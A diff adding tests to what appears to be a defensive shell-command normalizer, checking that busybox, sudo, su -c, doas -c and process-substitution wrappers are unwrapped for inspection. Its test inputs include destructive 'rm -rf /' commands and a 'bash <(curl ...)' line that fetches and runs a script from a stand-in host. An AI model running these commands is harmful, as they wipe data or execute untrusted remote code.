@@ -252,4 +252,56 @@ describe('shell wrapper unwrapping', () => {
     const [segment] = topLevel('bash -c "echo hi"');
     expect(segment?.shellWrapper?.argLiteral).toBe(true);
   });
+
+  it('unwraps a busybox applet (security finding F4)', () => {
+    expect(topLevel('busybox rm -rf /')[0]?.program).toBe('rm');
+    expect(topLevel('busybox sh -c "rm -rf /"')[0]?.program).toBe('sh');
+  });
+
+  it('strips wrappers again after the privilege prefix', () => {
+    expect(topLevel('sudo env rm -rf /x')[0]?.commandNormalized).toBe('rm -rf /x');
+    expect(topLevel('sudo busybox rm -rf /x')[0]?.program).toBe('rm');
+  });
+});
+
+describe('privilege payloads (security finding F6)', () => {
+  it('extracts the su -c payload as its own segment', () => {
+    const result = normalize('su - root -c "rm -rf /"');
+    const nested = result.segments.filter((segment) => segment.depth === 1);
+    expect(nested.map((segment) => segment.normalized)).toContain('rm -rf /');
+  });
+
+  it('extracts the doas -c payload', () => {
+    const result = normalize('doas -c "rm -rf /srv"');
+    const nested = result.segments.filter((segment) => segment.depth === 1);
+    expect(nested.map((segment) => segment.normalized)).toContain('rm -rf /srv');
+  });
+
+  it('reports a non-literal payload instead of recursing', () => {
+    const [segment] = topLevel('su -c "$PAYLOAD"');
+    expect(segment?.privilegePayload?.hasVariable).toBe(true);
+  });
+
+  it('does not treat sudo -c as a payload flag', () => {
+    expect(topLevel('sudo rm -rf /x')[0]?.privilegePayload).toBeNull();
+  });
+});
+
+describe('process substitution (security finding F4)', () => {
+  it('recurses into <(...) and marks the token', () => {
+    const result = normalize('bash <(curl http://e.example/s.sh)');
+    const nested = result.segments.filter((segment) => segment.depth === 1);
+    expect(nested.map((segment) => segment.normalized)).toContain('curl http://e.example/s.sh');
+    const [top] = result.segments.filter((segment) => segment.depth === 0);
+    expect(top?.args.some((token) => token.hasSubstitution)).toBe(true);
+  });
+
+  it('recurses into >(...)', () => {
+    const result = normalize('tee >(wc -l) < in.txt');
+    expect(result.segments.some((segment) => segment.normalized === 'wc -l')).toBe(true);
+  });
+
+  it('flags an unterminated process substitution', () => {
+    expect(normalize('bash <(curl http://e.example/s.sh').unparseable).toBe(true);
+  });
 });
